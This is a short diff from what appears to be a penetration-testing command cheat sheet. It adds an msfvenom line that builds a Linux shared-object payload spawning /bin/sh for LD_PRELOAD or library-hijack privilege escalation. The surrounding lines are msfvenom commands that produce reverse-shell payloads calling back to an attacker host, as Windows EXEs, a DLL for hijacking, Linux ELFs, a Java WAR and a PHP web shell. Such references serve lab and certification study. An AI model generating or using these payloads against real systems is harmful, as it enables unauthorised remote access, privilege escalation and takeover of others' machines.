@@ -52,6 +52,7 @@ msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort>
 msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -b '\x00\x2f\x0a' -f exe -o <filename1> # Windows EXE2; kali-machine
 msfvenom:msfvenom -p linux/x86/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f elf > shell.elf # Linux ELF; kali-machine
 msfvenom:msfvenom -p linux/x86/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f elf -o shell.elf # Linux x86; kali-machine
+msfvenom:msfvenom -p linux/x64/exec CMD=/bin/sh -f elf-so -o <filename1>.so #generate Linux x64 shared-object payload that executes /bin/sh for LD_PRELOAD, library hijacking, or shared-object privesc paths; kali-machine
 msfvenom:msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f war > shell.war # java war; kali-machine
 msfvenom:msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f dll -o tzres.dll # dll payload for dll hijack; kali-machine
 msfvenom:msfvenom -p php/reverse_php LHOST=<kali> LPORT=<kaliPort> -f raw -o shell.php # PHP web shell/vuln upload; kali-machine
